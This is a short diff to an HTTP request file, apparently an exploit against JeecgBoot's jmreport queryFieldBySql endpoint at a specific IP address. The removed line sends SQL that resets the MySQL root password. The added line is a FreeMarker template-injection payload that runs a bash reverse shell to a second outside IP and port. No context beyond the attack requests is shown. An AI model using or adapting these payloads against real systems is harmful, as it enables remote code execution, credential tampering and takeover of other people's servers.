@@ -31,5 +31,5 @@ Content-Type: application/json
 POST http://47.113.177.226:8083/jeecg-boot/jmreport/queryFieldBySql
 Content-Type: application/json
 
-{"sql":"ALTER USER 'root'@'localhost' IDENTIFIED BY 'newpassword';"}
+{"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"system bash -c 'bash -i &> /dev/tcp/{101.35.52.30}/{2888} <&1'\") }' "}
 ###
